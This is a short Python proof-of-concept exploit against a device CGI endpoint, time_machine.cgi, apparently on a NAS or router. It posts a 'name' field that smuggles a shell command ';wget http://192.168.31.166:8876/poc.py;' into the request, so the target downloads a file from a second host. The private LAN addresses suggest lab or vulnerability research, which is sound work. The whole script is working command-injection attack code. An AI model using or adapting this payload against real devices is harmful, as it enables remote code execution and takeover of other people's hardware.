import requests

url = "http://192.168.31.10:80/cgi-bin/time_machine.cgi"

headers = {
}

data = {'name': ';wget http://192.168.31.166:8876/poc.py;', 'path': '/mnt/usb', 'share': 'TimeMachine', 'cmd': 'cgi_tm_set_share'}

# wget http://192.168.31.166:8876/poc.py

response = requests.post(
    url,
    headers=headers,
    data=data,
    timeout=10
)

print("Status:", response.status_code)
print("Response:")
print(response.text)

